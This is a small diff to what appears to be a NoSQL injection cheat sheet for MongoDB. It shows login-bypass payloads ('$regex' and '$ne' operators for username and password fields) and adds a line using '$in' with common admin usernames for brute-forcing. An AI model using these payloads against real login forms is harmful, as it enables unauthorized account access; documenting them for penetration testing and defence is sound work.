@@ -46,6 +46,7 @@ For URL-based inputs, you can insert query operators via URL parameters. For exa
 ```
 {"$regex":""} >> For username
 {"$ne":"Invalid"} >> For password
+{"$in":["admin","administrator","superadmin"]} >> For bruteforce
 ```
 # MongoDB Data Retrieving
 ```
